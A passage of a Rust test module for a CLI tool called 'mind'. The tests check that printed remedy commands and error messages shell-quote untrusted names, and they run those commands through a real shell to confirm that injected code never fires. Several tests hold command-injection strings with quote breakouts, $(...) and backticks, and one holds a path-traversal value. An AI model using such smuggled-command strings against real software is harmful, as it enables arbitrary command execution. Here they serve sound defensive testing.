        // real shell with `mind` swapped for `printf`, so an injection would
        // fire the embedded `touch` rather than the argument being handed to
        // `printf` as inert data.
        if Command::new("sh").arg("-c").arg("true").status().is_err() {
            return;
        }
        for (sentinel_path, command) in [
            (
                "/tmp/mind-hook-105-pwned",
                format!("mind hooks run {quoted_source}"),
            ),
            (
                "/tmp/mind-hook-105-item-pwned",
                format!("mind hooks run {quoted_item}"),
            ),
        ] {
            let sentinel = std::path::Path::new(sentinel_path);
            let _ = std::fs::remove_file(sentinel);
            let probe = command.replacen("mind hooks run", "printf '%s\\n'", 1);
            let out = Command::new("sh")
                .arg("-c")
                .arg(&probe)
                .output()
                .expect("sh -c must run");
            assert!(
                out.status.success(),
                "the quoted example must parse as one shell argument: {probe:?}\nstderr: {}",
                String::from_utf8_lossy(&out.stderr)
            );
            assert!(
                !sentinel.exists(),
                "the injected 'touch' must not have executed via the printed \
                 example: {probe:?}"
            );
            let _ = std::fs::remove_file(sentinel);
        }
    }

    /// HOOK-106 Fix 2: the SAME whole-frame-paste proof as
    /// `hooks_cmd::tests::source_skip_note_whole_framed_remedy_is_inert_when_pasted_with_the_frame`,
    /// for `HooksNotRun`'s single-match arm. On the OLD double-quote
    /// presentation frame, copying the frame's own `"` characters together
    /// with the (already single-quoted) identity re-exposed `$`/backtick
    /// inside it; the new frame carries no shell-quote character, so pasting
    /// it whole must stay inert.
    // spec: HOOK-106
    #[test]
    fn hooks_not_run_message_whole_framed_remedy_is_inert_when_pasted_with_the_frame() {
        use std::process::Command;
        if Command::new("sh").arg("-c").arg("true").status().is_err() {
            return;
        }
        let sentinel = std::path::Path::new("/tmp/mind-hook-106-whole-frame-pwned");
        let _ = std::fs::remove_file(sentinel);
        let evil = "$(touch /tmp/mind-hook-106-whole-frame-pwned)`touch /tmp/mind-hook-106-whole-frame-pwned`".to_string();
        let msg = hooks_not_run_message("target", "install", 1, std::slice::from_ref(&evil));

        let lead_at = msg
            .find("re-run unattended with:")
            .expect("message has a remedy frame");
        let framed_remedy = &msg[lead_at..];

        let _ = Command::new("sh").arg("-c").arg(framed_remedy).output();
        assert!(
            !sentinel.exists(),
            "pasting the whole framed remedy (frame included) must not execute \
             the embedded command substitution: {framed_remedy:?}"
        );
        let _ = std::fs::remove_file(sentinel);
    }

    #[test]
    fn self_update_policy_displays_detail() {
        // spec: POL-52 -- the disabled case reads "self-update is disabled by the
        // managed policy" (carried as `detail`).
        let disabled = MindError::SelfUpdatePolicy {
            detail: "self-update is disabled by the managed policy".into(),
        }
        .to_string();
        assert!(
            disabled.contains("disabled by the managed policy"),
            "disabled detail must appear: {disabled}"
        );

        // spec: POL-53 -- the pin-mismatch case names the pin and the conflict.
        // `--to` is the flag's current name (`--version` is now a hidden
        // deprecated alias, src/cli.rs); this pins the message shape the
        // real `src/selfupdate.rs` pin-conflict path produces.
        let mismatch = MindError::SelfUpdatePolicy {
            detail: "managed policy pins self-update to 0.14.0; --to 0.15.0 conflicts with the pin"
                .into(),
        }
        .to_string();
        assert!(mismatch.contains("0.14.0"), "must name the pin: {mismatch}");
        assert!(
            mismatch.contains("0.15.0"),
            "must name the requested version: {mismatch}"
        );
        assert!(
            mismatch.contains("conflicts"),
            "must say 'conflicts': {mismatch}"
        );
    }

    /// M21 / STO-77: a malformed `--to` target must surface as
    /// `SelfUpdateInvalidTarget`, NOT `SelfUpdatePolicy` -- a distinct `kind`
    /// so a reader (human or a CI log parser) does not read a bad argument as
    /// a managed-policy refusal. Checks the message names the value and the
    /// reason, and that the two variants' `kind()` slugs are both stable AND
    /// different from each other.
    #[test]
    fn self_update_invalid_target_is_a_distinct_kind_from_self_update_policy() {
        // spec: STO-77
        let e = MindError::SelfUpdateInvalidTarget {
            value: "1/../../../../attacker/mind/releases/download/v1".to_string(),
        };
        let msg = e.to_string();
        assert!(
            msg.contains("attacker"),
            "message must name the rejected value: {msg}"
        );
        assert!(
            msg.contains("not a plausible"),
            "message must explain the value is implausible: {msg}"
        );
        assert_eq!(
            e.kind(),
            "self-update-invalid-target",
            "kind must be its own stable slug"
        );
        assert_ne!(
            e.kind(),
            MindError::SelfUpdatePolicy { detail: "d".into() }.kind(),
            "a malformed target must NOT share SelfUpdatePolicy's kind -- otherwise a bad \
             --to argument reads as a managed-policy refusal"
        );
    }

    // ---- CLI-225: printed remedies shell-quote interpolated identities -----

    /// Prove a printed remedy is inert when pasted into a real shell: swap the
    /// `<verb_prefix>` binary invocation for `printf '%s\n'` so an injected
    /// `;`/`$(...)`/backtick would fire its embedded `touch` (dropping
    /// `sentinel`) instead of being handed to the command as inert data, exactly
    /// the printf-swap technique `tests/cli_hooks.rs` uses. `expected_arg` must
    /// come back in printf's output as one literal argument, proving the
    /// `shell_quote` passed it through unexecuted. Skips (does not fail) when no
    /// `sh` is on PATH, mirroring `selfupdate.rs`'s `have("sh")` guard.
    fn assert_command_inert(command: &str, verb_prefix: &str, sentinel: &str, expected_arg: &str) {
        assert!(
            command.starts_with(verb_prefix),
            "extracted command must start with the verb: {command:?}"
        );
        if Command::new("sh").arg("-c").arg("true").status().is_err() {
            return;
        }
        let sentinel_path = std::path::Path::new(sentinel);
        let _ = std::fs::remove_file(sentinel_path);
        let probe = command.replacen(verb_prefix, "printf '%s\\n'", 1);
        let out = Command::new("sh")
            .arg("-c")
            .arg(&probe)
            .output()
            .expect("sh -c must run");
        assert!(
            !sentinel_path.exists(),
            "the injected command fired via the printed remedy: {probe:?}"
        );
        let _ = std::fs::remove_file(sentinel_path);
        assert!(
            out.status.success(),
            "the quoted remedy must parse as shell arguments: {probe:?}\nstderr: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(
            String::from_utf8_lossy(&out.stdout).contains(expected_arg),
            "the identity must survive as one literal argument: stdout {:?}",
            String::from_utf8_lossy(&out.stdout)
        );
    }

    /// CLI-225 (P1 injection sweep): `LinkedSourceGone`'s `mind unmeld <source>`
    /// remedy must shell-quote the source identity, closing the same class the
    /// `hooks run` family closed. The old message framed the raw name in single
    /// quotes (`'mind unmeld {source_name}'`), so a source name carrying a `'`
    /// broke out and a paste of `mind unmeld ...` ran the injected code. Proved
    /// two ways: the message carries the properly `shell_quote`d form (not the
    /// broken bare frame), and running the printed command through a real shell
    /// leaves the identity intact with the injected `touch` never firing.
    // spec: CLI-225
    #[test]
    fn linked_source_gone_remedy_shell_quotes_the_source_identity() {
        let evil = "s'; touch /tmp/mind-lsg-pwned; echo '`id`$(id)";
        let e = MindError::LinkedSourceGone {
            source_name: evil.to_string(),
            path: "/gone".into(),
        };
        let msg = e.to_string();
        // The runnable command the message prints, reconstructed from the same
        // `shell_quote` the Display uses. The `contains` check ties this exact
        // string to what was printed; building it directly (rather than parsing
        // it back out of prose) sidesteps the backtick in the payload, which
        // would otherwise confuse a naive backtick-delimited extraction.
        let command = format!("mind unmeld {}", shell_quote(evil));
        assert!(
            msg.contains(&command),
            "the unmeld remedy must carry the shell-quoted identity: {msg}"
        );
        assert!(
            !msg.contains(&format!("mind unmeld '{evil}'")),
            "must never fall back to the broken single-quote-framed raw name: {msg}"
        );
        assert_command_inert(&command, "mind unmeld", "/tmp/mind-lsg-pwned", evil);
    }

    /// CLI-225 (P1 injection sweep): `AgentCollision`'s `mind forget agent:<name>`
    /// remedy must shell-quote the `agent:<name>` argument. The agent's bare
    /// harness name is its source-controlled frontmatter `name:`, unrestricted
    /// against shell metacharacters, and the old message spliced it straight into
    /// the runnable command.
    // spec: CLI-225
    #[test]
    fn agent_collision_remedy_shell_quotes_the_forget_argument() {
        let evil = "dev'; touch /tmp/mind-agentcol-pwned; echo '`id`";
        let e = MindError::AgentCollision {
            name: evil.to_string(),
            existing: "github.com/a/one".into(),
            incoming: "github.com/a/two".into(),
        };
        let msg = e.to_string();
        let command = format!("mind forget {}", shell_quote(&format!("agent:{evil}")));
        assert!(
            msg.contains(&command),
            "the forget remedy must carry the shell-quoted agent ref: {msg}"
        );
        assert!(
            !msg.contains(&format!("mind forget agent:{evil}")),
            "must never splice the raw agent name into the runnable command: {msg}"
        );
        assert_command_inert(
            &command,
            "mind forget",
            "/tmp/mind-agentcol-pwned",
            &format!("agent:{evil}"),
        );
    }

    /// CLI-225 (P1 injection sweep): `SkillCollision`'s
    /// `mind meld --namespace <prefix> <repo>` remedy must shell-quote the
    /// suggested prefix. For a local-path meld the prefix is a directory
    /// basename, which can carry `;`/`'`/whitespace; the old message interpolated
    /// it bare. The `<repo>` placeholder (which carries `<`/`>` the shell would
    /// read as redirections) is stripped before the round-trip so only the
    /// `--namespace <prefix>` segment under test is executed.
    // spec: CLI-225
    #[test]
    fn skill_collision_remedy_shell_quotes_the_suggested_prefix() {
        let evil = "fork'; touch /tmp/mind-skillcol-pwned; echo '`id`";
        let e = MindError::SkillCollision {
            conflicts: vec![(
                "skill".into(),
                "review".into(),
                "github.com/acme/agents".into(),
            )],
            suggested: evil.to_string(),
        };
        let msg = e.to_string();
        assert!(
            msg.contains(&format!(
                "mind meld --namespace {} <repo>",
                shell_quote(evil)
            )),
            "the meld remedy must carry the shell-quoted prefix: {msg}"
        );
        assert!(
            !msg.contains(&format!("--namespace {evil}")),
            "must never interpolate the raw prefix into the runnable command: {msg}"
        );
        // The printed command carries a `<repo>` placeholder whose `<`/`>` the
        // shell would read as redirections, so drop it and exercise only the
        // `--namespace <prefix>` segment under test through the round-trip.
        let command = format!("mind meld --namespace {}", shell_quote(evil));
        assert_command_inert(&command, "mind meld", "/tmp/mind-skillcol-pwned", evil);
    }

    /// CLI-225 / M5 (P1 injection sweep): `UpgradeRenameCollision`'s
    /// `mind forget <key>` remedy must shell-quote `key`. `key` is a manifest
    /// key (`kind:name`) built from a source-controlled item name --
    /// `catalog::is_safe_item_name` rejects only `/`, `\`, NUL, and blocked
    /// Unicode, never shell metacharacters -- and the old message spliced it
    /// straight into the backticked `mind forget {key}` command, so a skill
    /// named e.g. `x; touch /tmp/pwned` produced a remedy that ran the
    /// attacker's command when pasted. Proved two ways, mirroring the sibling
    /// sweep tests above: the message carries the properly `shell_quote`d
    /// form (not the broken bare splice), and running the printed command
    /// through a real shell leaves the key intact with the injected `touch`
    /// never firing.
    // spec: CLI-225
    #[test]
    fn upgrade_rename_collision_remedy_shell_quotes_the_forget_argument() {
        let evil = "skill:x; touch /tmp/mind-renamecol-pwned; echo '`id`$(id)";
        let e = MindError::UpgradeRenameCollision {
            key: evil.to_string(),
            existing_source: "github.com/acme/one".into(),
            incoming: "skill:jx:x".into(),
            incoming_source: "github.com/acme/two".into(),
        };
        let msg = e.to_string();
        let command = format!("mind forget {}", shell_quote(evil));
        assert!(
            msg.contains(&command),
            "the forget remedy must carry the shell-quoted key: {msg}"
        );
        assert!(
            !msg.contains(&format!("mind forget {evil}")),
            "must never splice the raw key into the runnable command: {msg}"
        );
        assert_command_inert(&command, "mind forget", "/tmp/mind-renamecol-pwned", evil);
    }

    // ---- DSC-91: shared metadata size cap ----------------------------------

    use std::sync::atomic::{AtomicU32, Ordering};
    static CAP_N: AtomicU32 = AtomicU32::new(0);

    fn cap_tmp(label: &str) -> PathBuf {
        let n = CAP_N.fetch_add(1, Ordering::SeqCst);
        std::env::temp_dir().join(format!("mind-metacap-{}-{label}-{n}", std::process::id()))
    }

    #[test]
    fn read_capped_metadata_reads_a_normal_file() {
        // spec: DSC-91
        let path = cap_tmp("ok");
        std::fs::write(&path, "hello metadata").unwrap();
        let text = read_capped_metadata(&path).expect("small file must read fine");
        assert_eq!(text, "hello metadata");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn read_capped_metadata_refuses_an_oversized_file_naming_it() {
        // spec: DSC-91
        // A file at (limit + 1) bytes must be refused with MetadataTooLarge
        // naming the path and the limit. Built as a sparse file (`set_len`) so
        // the test itself never allocates/writes METADATA_SIZE_LIMIT bytes.
        let path = cap_tmp("big");
        let file = std::fs::File::create(&path).unwrap();
        file.set_len(METADATA_SIZE_LIMIT + 1).unwrap();
        drop(file);
        let err = read_capped_metadata(&path).expect_err("oversized file must be refused");
        match &err {
            MindError::MetadataTooLarge { path: p, limit } => {
                assert_eq!(p, &path, "error must name the offending file");
                assert_eq!(*limit, METADATA_SIZE_LIMIT, "error must name the limit");
            }
            other => panic!("expected MetadataTooLarge, got: {other:?}"),
        }
        let msg = err.to_string();
        assert!(
            msg.contains(&path.display().to_string()),
            "message must name the file: {msg}"
        );
        assert!(msg.contains("8 MiB"), "message must name the limit: {msg}");
        assert!(
            msg.contains("trim") || msg.contains("move"),
            "message must say what to do: {msg}"
        );
        assert_eq!(err.kind(), "metadata-too-large", "kind slug must be stable");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn read_capped_metadata_a_file_exactly_at_the_limit_is_accepted() {
        // spec: DSC-91 -- the cap is exclusive: exactly `limit` bytes must pass.
        let path = cap_tmp("exact");
        let file = std::fs::File::create(&path).unwrap();
        file.set_len(METADATA_SIZE_LIMIT).unwrap();
        drop(file);
        let text = read_capped_metadata(&path).expect("a file exactly at the cap must be OK");
        assert_eq!(text.len() as u64, METADATA_SIZE_LIMIT);
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn read_capped_metadata_missing_file_is_plain_io_error() {
        // spec: DSC-91 -- a nonexistent file surfaces as a plain Io error, not
        // MetadataTooLarge, so callers that treat "absent" specially still can.
        let path = cap_tmp("missing");
        let err = read_capped_metadata(&path).unwrap_err();
        assert!(
            matches!(err, MindError::Io { .. }),
            "missing file must be a plain Io error: {err:?}"
        );
    }
}
